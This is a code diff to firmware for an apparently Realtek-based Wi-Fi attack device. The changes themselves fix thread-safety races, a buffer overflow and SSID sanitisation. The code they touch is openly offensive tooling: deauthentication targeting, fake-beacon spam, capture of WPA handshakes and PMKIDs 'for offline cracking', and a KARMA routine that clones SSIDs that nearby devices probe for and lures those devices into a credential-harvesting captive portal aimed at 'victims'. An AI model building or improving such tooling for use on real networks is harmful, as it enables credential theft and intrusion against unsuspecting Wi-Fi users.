@@ -57,6 +57,7 @@ enum portals{
 #include "web_lwip.h"
 // Deferred log for the lwIP/tcpip thread (DHCP/DNS must not write the UART directly).
 #include "lwip_log.h"
+#include "petrel_http.h"   // channel validity (host-tested)
 
 // Stop the SDK's built-in DHCP server (in lib_arduino.a) so our option-114 server
 // can own UDP:67. Declared here to avoid pulling the whole dhcps.h.
@@ -101,13 +102,25 @@ static const char* ghost_ssids[8] = {
 
 
 std::vector<WiFiScanResult> scan_results;
-volatile bool scan_done = false;  // set by scanResultHandler when the driver reports completion
+// Driver scan completion. The driver task writes, loop() reads: release/acquire, not volatile.
+static bool scan_done = false;
+#define SCANDONE_LOAD()   __atomic_load_n(&scan_done, __ATOMIC_ACQUIRE)
+#define SCANDONE_SET(v)   __atomic_store_n(&scan_done, (v), __ATOMIC_RELEASE)
+// True while the driver may still be calling scanResultHandler. A timeout does NOT cancel the scan,
+// so the next scan must wait for the old one before clearing the vector under it.
+static bool scan_running = false;
 std::vector<int> deauth_wifis, wifis_temp;
 //WiFiServer server(80);
 uint8_t deauth_bssid[6];
 uint16_t deauth_reason = 2;
 bool randomSSID, rickroll, ghostSpam;
-char randomString[19];
+// Random source MAC for the RANDOM / RICKROLL beacon loops. It used to be a 19-byte text buffer
+// written with 7 x 3 bytes (overflow) and then handed to tx_beacon_raw() as if it were binary.
+static uint8_t randMac[6];
+static void random_mac(uint8_t* m) {
+  for (int i = 0; i < 6; i++) m[i] = (uint8_t)random(0, 256);
+  m[0] = (uint8_t)((m[0] | 0x02) & 0xFE);   // locally administered, unicast
+}
 int allChannels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 36, 40, 44, 48, 149, 153, 157, 161};
 int portal=0;
 // C2: rotate the served portal on every captured credential (so successive victims get
@@ -160,6 +173,20 @@ static bool is_dfs_channel(int ch) {
   return (ch >= 52 && ch <= 64) || (ch >= 100 && ch <= 144);
 }
 
+// Channel validity lives in common/petrel_http.h so the host tests can cover it.
+static inline bool is_valid_tx_channel(int ch) { return petrel_chan_valid(ch) != 0; }
+
+// SSID text is printed inside line protocols; a control byte would split the line and a '|' would
+// shift every later field.
+static void sanitize_text(const char* in, char* out, size_t cap) {
+  size_t i = 0;
+  for (; in && in[i] && i + 1 < cap; i++) {
+    unsigned char c = (unsigned char)in[i];
+    out[i] = (c >= 0x20 && c < 0x7F && c != '|') ? (char)c : '?';
+  }
+  out[i] = 0;
+}
+
 static int hexnib(char c) {
   if (c >= '0' && c <= '9') return c - '0';
   if (c >= 'a' && c <= 'f') return c - 'a' + 10;
@@ -190,7 +217,7 @@ int status = WL_IDLE_STATUS;
 rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
   rtw_scan_result_t *record;
   if (scan_result->scan_complete != 0) {
-    scan_done = true;   // driver signalled completion -> all results are in
+    SCANDONE_SET(true);   // release: every pushed result is visible to loop()
     return RTW_SUCCESS;
   }
   {
@@ -240,9 +267,21 @@ void destroyAP();
 
 int scanNetworks(int miliseconds) {
   DEBUG_SER_PRINT("Scanning WiFi networks ("+(String)miliseconds+" ms)...\n");
+  // A previous scan that timed out is still delivering callbacks; clearing the vector under it
+  // corrupted storage and let a late completion satisfy this scan. Wait for it first.
+  if (scan_running) {
+    uint32_t w0 = millis();
+    while (!SCANDONE_LOAD() && (millis() - w0) < 3000u) delay(10);
+    if (!SCANDONE_LOAD()) {
+      DEBUG_SER_PRINT(" previous scan still running; skipping\n");
+      return 1;
+    }
+    scan_running = false;
+  }
   scan_results.clear();
   if (scan_results.capacity() < 64) scan_results.reserve(64);   // avoid realloc per push_back
-  scan_done = false;
+  SCANDONE_SET(false);
+  scan_running = true;
   DEBUG_SER_PRINT("wifi get band type:"+(String)wifi_get_band_type()+"\n");
   DEBUG_SER_PRINT("scan results cleared...");
   
@@ -253,7 +292,7 @@ int scanNetworks(int miliseconds) {
     // immediately-following LIST race the results -> empty/partial list.
     uint32_t t0 = millis();
     uint32_t maxwait = (uint32_t)miliseconds + 5000u;
-    while (!scan_done && (millis() - t0) < maxwait) {
+    while (!SCANDONE_LOAD() && (millis() - t0) < maxwait) {
       led_w(LED_G, !digitalRead(LED_G));
       delay(100);
     }
@@ -261,13 +300,15 @@ int scanNetworks(int miliseconds) {
     // Report a completion timeout. scan_done is the DRIVER's completion event: if it never arrives
     // the results are stale/partial, and returning success here silently produced an empty list
     // that the host could not distinguish from a real one.
-    if(!scan_done) {
+    if(!SCANDONE_LOAD()) {
       DEBUG_SER_PRINT(" scan completion TIMEOUT after "+(String)maxwait+" ms (no scan_done)\n");
-      return 1;
+      return 1;   // scan_running stays true: the next scan waits for the driver
     }
+    scan_running = false;
     DEBUG_SER_PRINT(" done! n="+(String)scan_results.size()+"\n");
     return 0;
   } else {
+    scan_running = false;
     DEBUG_SER_PRINT(" failed!\n");
     return 1;
   }
@@ -349,8 +390,13 @@ static volatile uint32_t pm_total = 0, pm_mgmt = 0, pm_ctrl = 0, pm_data = 0, pm
 #define HS_MAX 8           // frames kept per capture (a full 4-way is 4; trimmed 12->8 to free
                            // BD_RAM_NS for the M4 offensive + raw-lwIP WebUI BSS; holds 2 handshakes)
 #define HS_FRAME_MAX 256   // per-frame byte cap
-static volatile bool hs_cap = false;
-static volatile uint16_t hs_count = 0;
+// Cross-task: the promiscuous callback writes, loop() reads/arms. Atomic accessors below.
+static bool hs_cap = false;
+static uint16_t hs_count = 0;
+#define HSCAP_ON()      __atomic_load_n(&hs_cap, __ATOMIC_ACQUIRE)
+#define HSCAP_SET(v)    __atomic_store_n(&hs_cap, (v), __ATOMIC_RELEASE)
+#define HSCOUNT_LOAD()  __atomic_load_n(&hs_count, __ATOMIC_ACQUIRE)
+#define HSCOUNT_SET(v)  __atomic_store_n(&hs_count, (v), __ATOMIC_RELEASE)
 static uint8_t hs_frames[HS_MAX][HS_FRAME_MAX];
 static uint16_t hs_lens[HS_MAX];
 // Selected-AP capture binding. hsg_start()/PMKIDCLIENT set these; the promisc callbacks then store
@@ -374,26 +420,29 @@ static volatile bool hsg_target_set = false;
 // until the pending 921600 baud upgrade. Growing the ring is gated on TIER-0.1 (trim static BSS).
 #define FRM_SLOTS 4u               // power-of-two; 3 usable (one slot kept empty for SPSC)
 #define FRM_SLOT  256u             // per-frame capture cap (matches HS_FRAME_MAX)
-#define FRM_DMB() __asm volatile("dmb" ::: "memory")
+// Acquire/release accessors: volatile alone is not synchronization on this weakly-ordered part.
+#define FRM_LOAD(p)   __atomic_load_n((p), __ATOMIC_ACQUIRE)
+#define FRM_STORE(p, v) __atomic_store_n((p), (v), __ATOMIC_RELEASE)
+#define SNIFF_ON()      __atomic_load_n(&sniff_stream, __ATOMIC_ACQUIRE)
+#define SNIFF_SET(v)    __atomic_store_n(&sniff_stream, (v), __ATOMIC_RELEASE)
 static uint8_t  frm_buf[FRM_SLOTS][FRM_SLOT];
 static uint16_t frm_caplen[FRM_SLOTS];   // bytes actually captured in the slot
 static uint16_t frm_orig[FRM_SLOTS];     // on-air frame length (>= caplen when truncated)
 static uint32_t frm_ts[FRM_SLOTS];       // millis() at capture
-static volatile uint16_t frm_head = 0, frm_tail = 0;
-static volatile uint32_t frm_drop = 0;
-static volatile bool sniff_stream = false;
+static uint16_t frm_head = 0, frm_tail = 0;
+static uint32_t frm_drop = 0;
+static bool sniff_stream = false;   // cross-task: atomic accessors below
 
 static inline void frm_push(const unsigned char *b, unsigned int len) {
-  uint16_t t = frm_tail;
+  uint16_t t = FRM_LOAD(&frm_tail);
   uint16_t nt = (uint16_t)((t + 1) & (FRM_SLOTS - 1));
-  if (nt == frm_head) { frm_drop++; return; }                 // full: drop newest
+  if (nt == FRM_LOAD(&frm_head)) { __atomic_add_fetch(&frm_drop, 1u, __ATOMIC_RELAXED); return; }
   uint16_t n = (len < FRM_SLOT) ? (uint16_t)len : (uint16_t)FRM_SLOT;  // clamp like L466
   memcpy(frm_buf[t], b, n);
   frm_caplen[t] = n;
   frm_orig[t]   = (len > 0xFFFFu) ? 0xFFFFu : (uint16_t)len;
   frm_ts[t]     = millis();
-  FRM_DMB();                                                  // publish slot before tail
-  frm_tail = nt;
+  FRM_STORE(&frm_tail, nt);                                   // release: slot published before tail
 }
 
 // RTW_PROMISC_ENABLE_2 (raw 802.11): buf[0] = frame control. type bits (buf[0]>>2)&3:
@@ -402,7 +451,7 @@ static inline void frm_push(const unsigned char *b, unsigned int len) {
 static void promisc_spike_cb(unsigned char *buf, unsigned int len, void *userdata) {
   (void)userdata;
   if (len < 1) return;
-  if (sniff_stream) frm_push(buf, len);   // M0.2: live stream gets every frame (all types)
+  if (SNIFF_ON()) frm_push(buf, len);   // M0.2: live stream gets every frame (all types)
   pm_total++;
   uint8_t ftype = (buf[0] >> 2) & 0x3;
   if (ftype == 0) pm_mgmt++;
@@ -415,7 +464,7 @@ static void promisc_spike_cb(unsigned char *buf, unsigned int len, void *userdat
       pm_eapol++;
       // Keep the whole frame (M1..M4) for offline cracking. memcpy only — this runs in
       // the driver/WiFi task, so no String/heap work here.
-      if (hs_cap && hs_count < HS_MAX) {
+      if (HSCAP_ON() && HSCOUNT_LOAD() < HS_MAX) {
         // Target binding: a pinned grab stores ONLY the selected AP's EAPOL. BSSID = addr1 when
         // ToDS (STA->AP), addr2 when FromDS (AP->STA), addr3 in an IBSS (neither bit set, where
         // addr3 IS the BSSID). No target set -> keep everything (CAPTURE).
@@ -423,9 +472,10 @@ static void promisc_spike_cb(unsigned char *buf, unsigned int len, void *userdat
         const uint8_t* fb = (ds == 0x01) ? buf + 4 : (ds == 0x02) ? buf + 10 : buf + 16;
         if (!hsg_target_set || memcmp(fb, hsg_bssid, 6) == 0) {
           uint16_t n = (len < HS_FRAME_MAX) ? (uint16_t)len : (uint16_t)HS_FRAME_MAX;
-          memcpy(hs_frames[hs_count], buf, n);
-          hs_lens[hs_count] = n;
-          hs_count++;
+          uint16_t hc = HSCOUNT_LOAD();
+          memcpy(hs_frames[hc], buf, n);
+          hs_lens[hc] = n;
+          HSCOUNT_SET((uint16_t)(hc + 1));   // release: frame published before the count
         }
       }
     }
@@ -434,7 +484,7 @@ static void promisc_spike_cb(unsigned char *buf, unsigned int len, void *userdat
 
 // Dump the captured EAPOL frames as hex lines the host tool turns into a .pcap.
 static void hs_stream(int ch) {
-  uint16_t n = hs_count;
+  uint16_t n = HSCOUNT_LOAD();
   String hdr = "HSCAP: ch=" + String(ch) + " count=" + String((unsigned)n);
   Serial.println(hdr); Serial1.println(hdr);
   for (uint16_t i = 0; i < n; i++) {
@@ -456,19 +506,17 @@ static void hs_stream(int ch) {
 // armed the board emits ONLY binary on Serial (the command gate routes any other reply to
 // Serial1), so DP_FRAME bytes never interleave with legacy ASCII on the bulk channel.
 static void framer_drain(void) {
-  while (frm_head != frm_tail) {
-    uint16_t h = frm_head;
-    FRM_DMB();                                   // tail seen (loop cond) before reading slot
+  while (FRM_LOAD(&frm_head) != FRM_LOAD(&frm_tail)) {
+    uint16_t h = FRM_LOAD(&frm_head);            // acquire: slot visible after the index
     uint8_t  rec[PETREL_FRAMEREC_HDR + FRM_SLOT];
     uint8_t  out[PETREL_FRAME_MAX];
     size_t   rn = petrel_framerec(frm_ts[h], frm_orig[h], frm_buf[h], frm_caplen[h], rec);
     size_t   n  = petrel_encode(DP_FRAME, rec, (uint16_t)rn, out);
     if (n) Serial.write(out, n);
-    FRM_DMB();                                   // finished reading slot before freeing it
-    frm_head = (uint16_t)((h + 1) & (FRM_SLOTS - 1));
+    FRM_STORE(&frm_head, (uint16_t)((h + 1) & (FRM_SLOTS - 1)));   // release: slot drained
   }
   static uint32_t last_drop = 0, last_ms = 0;
-  uint32_t d = frm_drop, now = millis();
+  uint32_t d = FRM_LOAD(&frm_drop), now = millis();
   if (d != last_drop && (now - last_ms) >= 200u) {
     uint8_t p[4] = { (uint8_t)d, (uint8_t)(d >> 8), (uint8_t)(d >> 16), (uint8_t)(d >> 24) };
     uint8_t out[PETREL_FRAME_MAX];
@@ -502,7 +550,9 @@ typedef struct {
   uint8_t n_akm;
 } pmf_ap_t;
 static pmf_ap_t pmf_aps[PMF_MAX_APS];
-static volatile uint8_t pmf_n = 0;
+static uint8_t pmf_n = 0;   // cross-task: atomic accessors below
+#define PMFN_LOAD()  __atomic_load_n(&pmf_n, __ATOMIC_ACQUIRE)
+#define PMFN_SET(v)  __atomic_store_n(&pmf_n, (v), __ATOMIC_RELEASE)
 
 static void pmf_parse(const uint8_t* f, unsigned len) {
   if (len < 36) return;
@@ -544,16 +594,17 @@ static void pmf_parse(const uint8_t* f, unsigned len) {
     i = d + l;
   }
   if (!have_rsn) return;
-  for (uint8_t k = 0; k < pmf_n; k++)
+  uint8_t n = PMFN_LOAD();
+  for (uint8_t k = 0; k < n; k++)
     if (!memcmp(pmf_aps[k].bssid, bssid, 6)) return;   // already seen
-  if (pmf_n >= PMF_MAX_APS) return;
-  pmf_ap_t* a = &pmf_aps[pmf_n];
+  if (n >= PMF_MAX_APS) return;
+  pmf_ap_t* a = &pmf_aps[n];
   memcpy(a->bssid, bssid, 6);
   memcpy(a->ssid, ssid, sizeof(a->ssid));
   a->caps = rcaps;
   a->sae = sae;
   a->n_akm = nakm;
-  pmf_n++;
+  PMFN_SET((uint8_t)(n + 1));   // release: record published before the count
 }
 
 static void promisc_pmf_cb(unsigned char* buf, unsigned int len, void* userdata) {
@@ -562,17 +613,19 @@ static void promisc_pmf_cb(unsigned char* buf, unsigned int len, void* userdata)
 }
 
 static void pmf_stream(int ch) {
-  for (uint8_t k = 0; k < pmf_n; k++) {
+  uint8_t n = PMFN_LOAD();
+  for (uint8_t k = 0; k < n; k++) {
     pmf_ap_t* a = &pmf_aps[k];
     const char* mfp = (a->caps & 0x0040) ? "req" : (a->caps & 0x0080) ? "cap" : "no";
-    char line[128];
+    char line[128], safe[33];
+    sanitize_text(a->ssid, safe, sizeof(safe));   // '|' / control bytes would break the fields
     snprintf(line, sizeof(line),
       "PMF:%02X:%02X:%02X:%02X:%02X:%02X|%s|akm=%u|sae=%u|mfp=%s",
       a->bssid[0], a->bssid[1], a->bssid[2], a->bssid[3], a->bssid[4], a->bssid[5],
-      a->ssid, (unsigned)a->n_akm, (unsigned)a->sae, mfp);
+      safe, (unsigned)a->n_akm, (unsigned)a->sae, mfp);
     Serial.println(line); Serial1.println(line);
   }
-  String fin = "PMFDONE: ch=" + String(ch) + " aps=" + String((unsigned)pmf_n);
+  String fin = "PMFDONE: ch=" + String(ch) + " aps=" + String((unsigned)n);
   Serial.println(fin); Serial1.println(fin);
 }
 
@@ -582,17 +635,27 @@ static void pmf_stream(int ch) {
 #define STA_MAX 24
 typedef struct { uint8_t mac[6]; uint16_t count; } sta_t;
 static sta_t sta_list[STA_MAX];
-static volatile uint8_t sta_n = 0;
+// Cross-task: the promiscuous callback appends, loop() reads (STADONE/BTMSTAS). Publish with
+// release, read with acquire, so a reader that sees the count also sees the MAC it counts.
+static uint8_t sta_n = 0;
+#define STA_LOAD()      __atomic_load_n(&sta_n, __ATOMIC_ACQUIRE)
+#define STA_STORE(v)    __atomic_store_n(&sta_n, (v), __ATOMIC_RELEASE)
 static uint8_t sta_filter[6];
-static volatile bool sta_filter_on = false;
+static bool sta_filter_on = false;   // cross-task: atomic accessors below
+#define STAF_LOAD()   __atomic_load_n(&sta_filter_on, __ATOMIC_ACQUIRE)
+#define STAF_SET(v)   __atomic_store_n(&sta_filter_on, (v), __ATOMIC_RELEASE)
 
 static void sta_add(const uint8_t* mac) {
-  for (uint8_t i = 0; i < sta_n; i++)
-    if (!memcmp(sta_list[i].mac, mac, 6)) { sta_list[i].count++; return; }
-  if (sta_n >= STA_MAX) return;
-  memcpy(sta_list[sta_n].mac, mac, 6);
-  sta_list[sta_n].count = 1;
-  sta_n++;
+  uint8_t n = STA_LOAD();
+  for (uint8_t i = 0; i < n; i++)
+    if (!memcmp(sta_list[i].mac, mac, 6)) {
+      __atomic_add_fetch(&sta_list[i].count, 1u, __ATOMIC_RELAXED);
+      return;
+    }
+  if (n >= STA_MAX) return;
+  memcpy(sta_list[n].mac, mac, 6);
+  sta_list[n].count = 1;
+  STA_STORE((uint8_t)(n + 1));
 }
 
 static void promisc_sta_cb(unsigned char* buf, unsigned int len, void* ud) {
@@ -604,12 +667,12 @@ static void promisc_sta_cb(unsigned char* buf, unsigned int len, void* ud) {
   const uint8_t *a1 = buf + 4, *a2 = buf + 10, *a3 = buf + 16;
   const uint8_t* sta = NULL;
   if (ftype == 2) {                                    // data
-    if (tods && !fromds) { if (sta_filter_on && memcmp(a1, sta_filter, 6)) return; sta = a2; }
-    else if (!tods && fromds) { if (sta_filter_on && memcmp(a2, sta_filter, 6)) return; sta = a1; }
+    if (tods && !fromds) { if (STAF_LOAD() && memcmp(a1, sta_filter, 6)) return; sta = a2; }
+    else if (!tods && fromds) { if (STAF_LOAD() && memcmp(a2, sta_filter, 6)) return; sta = a1; }
     else return;                                       // IBSS / WDS — ambiguous
   } else if (ftype == 0) {                             // mgmt: auth(11)/assoc-req(0)/reassoc-req(2)
     if (st != 11 && st != 0 && st != 2) return;
-    if (sta_filter_on && memcmp(a3, sta_filter, 6)) return;
+    if (STAF_LOAD() && memcmp(a3, sta_filter, 6)) return;
     sta = a2;
   } else return;
   if (sta && !(sta[0] & 0x01)) sta_add(sta);           // skip multicast/broadcast
@@ -623,7 +686,9 @@ static void promisc_sta_cb(unsigned char* buf, unsigned int len, void* ud) {
 #define CLI_MAX 10
 typedef struct { uint8_t mac[6]; uint16_t first; uint16_t last; uint16_t count; } cli_t;
 static cli_t cli_list[CLI_MAX];
-static volatile uint8_t cli_n = 0;
+static uint8_t cli_n = 0;   // cross-task: atomic accessors below
+#define CLIN_LOAD()  __atomic_load_n(&cli_n, __ATOMIC_ACQUIRE)
+#define CLIN_SET(v)  __atomic_store_n(&cli_n, (v), __ATOMIC_RELEASE)
 static volatile bool cli_on = false;
 static uint32_t cli_base = 0;      // millis() at the window start; times are stored in seconds
 // A2 RSSI: settled 2026-10-16 - the promisc callback buffer is the bare frame with its 4-byte FCS
@@ -634,19 +699,20 @@ static uint32_t cli_base = 0;      // millis() at the window start; times are st
 
 static void cli_add(const uint8_t* mac) {
   uint16_t now = (uint16_t)((millis() - cli_base) / 1000UL);
-  for(uint8_t i = 0; i < cli_n; i++) {
+  uint8_t cn = CLIN_LOAD();
+  for(uint8_t i = 0; i < cn; i++) {
     if(!memcmp(cli_list[i].mac, mac, 6)) {
       cli_list[i].last = now;
       if(cli_list[i].count < 65535) cli_list[i].count++;
       return;
     }
   }
-  if(cli_n >= CLI_MAX) return;
-  memcpy(cli_list[cli_n].mac, mac, 6);
-  cli_list[cli_n].first = now;
-  cli_list[cli_n].last = now;
-  cli_list[cli_n].count = 1;
-  cli_n++;
+  if(cn >= CLI_MAX) return;
+  memcpy(cli_list[cn].mac, mac, 6);
+  cli_list[cn].first = now;
+  cli_list[cn].last = now;
+  cli_list[cn].count = 1;
+  CLIN_SET((uint8_t)(cn + 1));   // release: record published before the count
 }
 
 static void promisc_cli_cb(unsigned char* buf, unsigned int len, void* ud) {
@@ -668,7 +734,8 @@ static void promisc_cli_cb(unsigned char* buf, unsigned int len, void* ud) {
 }
 
 static void cli_stream(int ch) {
-  for(uint8_t i = 0; i < cli_n; i++) {
+  uint8_t cn = CLIN_LOAD();
+  for(uint8_t i = 0; i < cn; i++) {
     char line[80];
     snprintf(
       line,
@@ -685,20 +752,21 @@ static void cli_stream(int ch) {
       (unsigned)cli_list[i].count);
     Serial.println(line); Serial1.println(line);
   }
-  String fin = "CLIDONE: ch=" + String(ch) + " n=" + String((unsigned)cli_n);
+  String fin = "CLIDONE: ch=" + String(ch) + " n=" + String((unsigned)cn);
   Serial.println(fin); Serial1.println(fin);
 }
 
 static void sta_stream(int ch) {
-  for (uint8_t i = 0; i < sta_n; i++) {
+  uint8_t sn = STA_LOAD();
+  for (uint8_t i = 0; i < sn; i++) {
     char line[64];
     snprintf(line, sizeof(line), "STA:%02X:%02X:%02X:%02X:%02X:%02X|%u",
       sta_list[i].mac[0], sta_list[i].mac[1], sta_list[i].mac[2],
       sta_list[i].mac[3], sta_list[i].mac[4], sta_list[i].mac[5],
-      (unsigned)sta_list[i].count);
+      (unsigned)__atomic_load_n(&sta_list[i].count, __ATOMIC_RELAXED));
     Serial.println(line); Serial1.println(line);
   }
-  String fin = "STADONE: ch=" + String(ch) + " n=" + String((unsigned)sta_n);
+  String fin = "STADONE: ch=" + String(ch) + " n=" + String((unsigned)STA_LOAD());
   Serial.println(fin); Serial1.println(fin);
 }
 
@@ -766,8 +834,10 @@ static void probe_stream(int ch) {
     if(probes[i].n == 0) {
       n += snprintf(line + n, sizeof(line) - n, "*");
     } else {
-      for(uint8_t k = 0; k < probes[i].n; k++)
-        n += snprintf(line + n, sizeof(line) - n, "%s%s", k ? "," : "", probes[i].ssid[k]);
+      for(uint8_t k = 0; k < probes[i].n; k++) {
+        char one[33]; sanitize_text(probes[i].ssid[k], one, sizeof(one));
+        n += snprintf(line + n, sizeof(line) - n, "%s%s", k ? "," : "", one);
+      }
     }
     Serial.println(line); Serial1.println(line);
   }
@@ -820,7 +890,7 @@ static int build_beacon_frame(uint8_t* f, const uint8_t* src, const uint8_t* dst
   // The optional IEs are appended only while they still fit, but the SSID is what has to survive
   // intact. The DS Parameter Set (our channel) is what makes the SSID appear in a normal scan list.
   int sl = ssid ? (int)strlen(ssid) : 0;
-  if(sl > TX_RAW_MAX_PAYLOAD - 40) sl = TX_RAW_MAX_PAYLOAD - 40;
+  if(sl > 32) sl = 32;   // 802.11 SSID element limit (the buffer cap alone allowed 88)
   f[n++] = 0x00; f[n++] = (uint8_t)sl;          // SSID IE
   for(int i = 0; i < sl; i++) f[n++] = (uint8_t)ssid[i];
   if(n + 6 <= TX_RAW_MAX_PAYLOAD) {             // supported rates IE
@@ -869,11 +939,32 @@ static void tx_beacon_raw(const uint8_t* src, const uint8_t* dst, const char* ss
 // SSID so repeated probes keep mapping to the same fake AP. Devices that remember the network see
 // it again and can then be pulled into the captive portal (C1 = Trap). TX is deferred to loop():
 // the promisc callback runs in the WiFi task, so it only records the request there.
-static bool karma_on = false;
+static bool karma_on = false;   // cross-task: atomic accessors below
 static int karma_chan = 6;
-static volatile bool karma_pending = false;
-static char karma_ssid[33] = {0};
+// KARMA request hand-off: the WiFi promiscuous task produces, loop() consumes. A single flag plus
+// shared buffers let the producer overwrite the bytes while loop() was still reading them, so the
+// request goes through a 2-slot ring and loop() copies the slot out before releasing it.
+#define KARMA_Q 2
+static char     karma_q_ssid[KARMA_Q][33];
+static uint8_t  karma_q_cli[KARMA_Q][6];
+static unsigned karma_q_tail = 0;   // producer
+static unsigned karma_q_head = 0;   // consumer
+static char karma_ssid[33] = {0};   // consumer-side copy (what the rest of loop() reads)
 static uint8_t karma_client[6] = {0};
+#define KQ_LOAD(p)   __atomic_load_n((p), __ATOMIC_ACQUIRE)
+#define KQ_STORE(p, v) __atomic_store_n((p), (v), __ATOMIC_RELEASE)
+#define KON_LOAD()   __atomic_load_n(&karma_on, __ATOMIC_ACQUIRE)
+#define KON_STORE(v) __atomic_store_n(&karma_on, (v), __ATOMIC_RELEASE)
+
+// loop() side: take the oldest request into karma_ssid/karma_client. False when there is none.
+static bool karma_take(void) {
+  unsigned h = KQ_LOAD(&karma_q_head);
+  if (h == KQ_LOAD(&karma_q_tail)) return false;
+  memcpy(karma_ssid, karma_q_ssid[h], sizeof(karma_ssid));
+  memcpy(karma_client, karma_q_cli[h], sizeof(karma_client));
+  KQ_STORE(&karma_q_head, (h + 1) % KARMA_Q);
+  return true;
+}
 // --- C1: KARMA -> Trap -----------------------------------------------------------------
 // Same sniffing as B1, but the first requested SSID is cloned for real: a softAP with that name
 // is started and the existing captive-portal plumbing serves the login page, so a device that
@@ -884,21 +975,26 @@ static bool trap_armed = true;
 static char trap_ssid[33] = {0};
 #define KARMA_SEEN_MAX 8
 static char karma_seen[KARMA_SEEN_MAX][33];
+// Written by the WiFi promiscuous task, read by loop(): publish with release, read with acquire, so
+// a reader that sees the count also sees the string it counts.
 static int karma_seen_n = 0;
+#define KSEEN_LOAD()      __atomic_load_n(&karma_seen_n, __ATOMIC_ACQUIRE)
+#define KSEEN_STORE(v)    __atomic_store_n(&karma_seen_n, (v), __ATOMIC_RELEASE)
 
 static void karma_note(const char* s) {
-  for(int i = 0; i < karma_seen_n; i++)
+  int n = KSEEN_LOAD();
+  for(int i = 0; i < n; i++)
     if(strcmp(karma_seen[i], s) == 0) return;
-  if(karma_seen_n < KARMA_SEEN_MAX) {
-    strncpy(karma_seen[karma_seen_n], s, 32);
-    karma_seen[karma_seen_n][32] = 0;
-    karma_seen_n++;
+  if(n < KARMA_SEEN_MAX) {
+    strncpy(karma_seen[n], s, 32);
+    karma_seen[n][32] = 0;
+    KSEEN_STORE(n + 1);
   }
 }
 
 static void promisc_karma_cb(unsigned char* buf, unsigned int len, void* ud) {
   (void)ud;
-  if(!karma_on || len < 24) return;
+  if(!KON_LOAD() || len < 24) return;
   if(((buf[0] >> 2) & 3) != 0) return;    // management frames only
   if(((buf[0] >> 4) & 0x0F) != 4) return; // subtype 4 = probe request
   int p = 24;                             // probe requests have no fixed params before the IEs
@@ -910,11 +1006,19 @@ static void promisc_karma_cb(unsigned char* buf, unsigned int len, void* ud) {
         uint8_t c = buf[p + 2 + i];
         if(c < 32 || c > 126) return;     // only answer printable SSIDs
       }
-      memcpy(karma_client, buf + 10, 6);  // addr2 = the probing client
-      memcpy(karma_ssid, buf + p + 2, l);
-      karma_ssid[l] = 0;
-      karma_note(karma_ssid);
-      karma_pending = true;
+      unsigned t = KQ_LOAD(&karma_q_tail);
+      if ((t + 1) % KARMA_Q == KQ_LOAD(&karma_q_head)) {
+        // Ring full: this probe is not answered, but it must still show up in KARMALIST.
+        char seen[33];
+        memcpy(seen, buf + p + 2, l); seen[l] = 0;
+        karma_note(seen);
+        return;
+      }
+      memcpy(karma_q_cli[t], buf + 10, 6);  // addr2 = the probing client
+      memcpy(karma_q_ssid[t], buf + p + 2, l);
+      karma_q_ssid[t][l] = 0;
+      karma_note(karma_q_ssid[t]);
+      KQ_STORE(&karma_q_tail, (t + 1) % KARMA_Q);
       return;
     }
     p += 2 + l;
@@ -1104,22 +1208,22 @@ static volatile int  wids_ch = 6;
 typedef struct { uint8_t type; uint8_t key[6]; uint16_t aux; } wids_alert_t;
 #define WIDS_Q 8
 static wids_alert_t wids_q[WIDS_Q];
-static volatile uint8_t wids_qh = 0, wids_qt = 0;
+static uint8_t wids_qh = 0, wids_qt = 0;   // SPSC: producer owns qt, consumer owns qh
 
 static inline void wids_push(uint8_t type, const uint8_t* key, uint16_t aux) {
-  uint8_t nt = (uint8_t)((wids_qt + 1) & (WIDS_Q - 1));
-  if (nt == wids_qh) return;   // full: drop (debounce makes overflow very unlikely)
-  wids_q[wids_qt].type = type;
-  memcpy(wids_q[wids_qt].key, key, 6);
-  wids_q[wids_qt].aux = aux;
-  FRM_DMB();
-  wids_qt = nt;
+  uint8_t t = FRM_LOAD(&wids_qt);
+  uint8_t nt = (uint8_t)((t + 1) & (WIDS_Q - 1));
+  if (nt == FRM_LOAD(&wids_qh)) return;   // full: drop (debounce makes overflow very unlikely)
+  wids_q[t].type = type;
+  memcpy(wids_q[t].key, key, 6);
+  wids_q[t].aux = aux;
+  FRM_STORE(&wids_qt, nt);   // release: slot published before the index
 }
 
 static void promisc_wids_cb(unsigned char* buf, unsigned int len, void* ud) {
   (void)ud;
   if (len < 26) return;
-  g_wids.seen_frames++;
+  __atomic_add_fetch(&g_wids.seen_frames, 1u, __ATOMIC_RELAXED);
   uint8_t ftype = (buf[0] >> 2) & 3;
   uint8_t stype = (buf[0] >> 4) & 0xF;
   if (ftype != 0) return;
@@ -1137,9 +1241,8 @@ static void promisc_wids_cb(unsigned char* buf, unsigned int len, void* ud) {
 }
 
 static void wids_drain(void) {
-  while (wids_qh != wids_qt) {
-    uint8_t h = wids_qh;
-    FRM_DMB();
+  while (FRM_LOAD(&wids_qh) != FRM_LOAD(&wids_qt)) {
+    uint8_t h = FRM_LOAD(&wids_qh);   // acquire: slot visible after the index
     wids_alert_t* a = &wids_q[h];
     char m[80];
     const char* name = (a->type == WIDS_DEAUTH_FLOOD) ? "DEAUTHFLOOD" :
@@ -1149,8 +1252,7 @@ static void wids_drain(void) {
     snprintf(m, sizeof(m), "WIDS:%s %02X%02X%02X%02X%02X%02X aux=%04X", name,
              a->key[0], a->key[1], a->key[2], a->key[3], a->key[4], a->key[5], a->aux);
     Serial.println(m); Serial1.println(m);
-    FRM_DMB();
-    wids_qh = (uint8_t)((h + 1) & (WIDS_Q - 1));
+    FRM_STORE(&wids_qh, (uint8_t)((h + 1) & (WIDS_Q - 1)));   // release: slot drained
   }
 }
 
@@ -1162,7 +1264,9 @@ static void wids_drain(void) {
 #define PMKID_MAX 8
 typedef struct { uint8_t ap[6], sta[6], pmkid[16]; } pmkid_t;
 static pmkid_t pmkids[PMKID_MAX];
-static volatile uint8_t pmkid_n = 0;
+static uint8_t pmkid_n = 0;   // cross-task: atomic accessors below
+#define PMKN_LOAD()  __atomic_load_n(&pmkid_n, __ATOMIC_ACQUIRE)
+#define PMKN_SET(v)  __atomic_store_n(&pmkid_n, (v), __ATOMIC_RELEASE)
 static volatile uint32_t cl_eapol = 0;   // EAPOL frames seen during a clientless grab (debug)
 
 static void hex12(const uint8_t* m, char* out) {
@@ -1190,13 +1294,14 @@ static void pmkid_handle(const uint8_t* buf, unsigned len) {
       const uint8_t* ap = (buf[1] & 0x02) ? buf + 10 : buf + 16;   // addr2 if FromDS
       const uint8_t* sta = buf + 4;                                // addr1 = receiver
